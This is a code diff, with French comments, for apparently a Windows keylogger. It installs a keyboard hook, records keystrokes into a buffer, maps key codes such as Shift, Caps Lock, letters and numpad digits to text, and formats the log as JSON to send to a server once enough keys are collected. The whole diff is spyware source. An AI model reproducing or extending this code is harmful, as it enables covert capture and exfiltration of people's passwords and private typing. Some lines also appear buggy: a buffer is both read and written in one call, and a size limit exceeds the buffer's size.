@@ -2,29 +2,17 @@
 #include <stdio.h>
 #include <time.h> 
 #include <stdlib.h>
-#include <conio.h> /*pour le getch() apparement spécifique pour certains compilateurs*/
 //#include "http.h"
 
-#define MAX_KEYS 12
+#define MAX_KEYS 100
 
-char key_log[MAX_KEYS];
+char key_log[MAX_KEYS*10];
 int current_key_log_size = 0;
-
-
-void key_code_log_to_string(){
-    // Permet d'avoir la touche exacte avec son code décimal
-    for(int i = 0; i < MAX_KEYS; i++){
-        printf("%c, %d \n", key_log[i],key_log[i]);
-    }
-}
-    
 
 
 void send_keys(void){
 
     /*Permet d'envoyer les frappes de claviers au serveur et de vider le tableau  key_log*/
-
-    key_code_log_to_string();
     
     char data[MAX_KEYS+50];
     snprintf(data, MAX_KEYS+50, "{\"keys\": \"%s\"}", key_log);
@@ -38,11 +26,62 @@ void send_keys(void){
 void log_key(int key) {
 
     /*Permet d'enregistrer les frappes de claviers dans le tab key_log*/
-    snprintf(key_log, 1024, "%s%c", key_log, key); // rajoute le caractère dans key_log
-    current_key_log_size++; // +=1
-    if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
-        send_keys();
+    char string_key[15];
+    int value_in_string_key = 1;
+
+    // Permet d'avoir la touche exacte avec son code décimal
+
+    /* 
+    
+    VALEUR -> correspondance
+        de 49 à 57: chiffres de 0 à 9  que si maj préssé
+        de 65 à 90: lettres (A-Z)
+        160: majuscule
+        223: point d'exclamation
+        de 96 à 105: chiffres de 0 à 9 (sur le pavé numérique)
+        20: verr maj
+    
+    */
+
+    switch (key) {
+        case 20:
+            strcpy(string_key, "[VERR_MAJ]");
+            break;
+
+        case 160:
+            strcpy(string_key, "[MAJ]");
+            break;
+
+        case 223:
+            strcpy(string_key, "!");
+            break;
+
+        default:
+            if (key >= 49 && key <= 57) {
+                string_key[0] = (char)key;
+                string_key[1] = '\0'; 
+            } else if (key >= 65 && key <= 90) {
+                string_key[0] = (char)key; 
+                string_key[1] = '\0';
+            } else if(key >= 96 && key <= 105){
+                string_key[0] = (char)(key - 48); // le nombre associé a la touche 47 = 49-96
+                string_key[1] = '\0';    
+            }else{
+                value_in_string_key = 0;
+            }
+            break;
     }
+
+
+    if(value_in_string_key){
+        printf("%s, %d \n", string_key,key);
+        snprintf(key_log, 1024, "%s%s", key_log, string_key); // rajoute le caractère dans key_log
+        current_key_log_size++; // +=1
+        if(current_key_log_size >= MAX_KEYS){ //vérifier si l'utilisateur à taper assez pour envoyer les clefs au server
+            send_keys();
+        }  
+    }
+
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
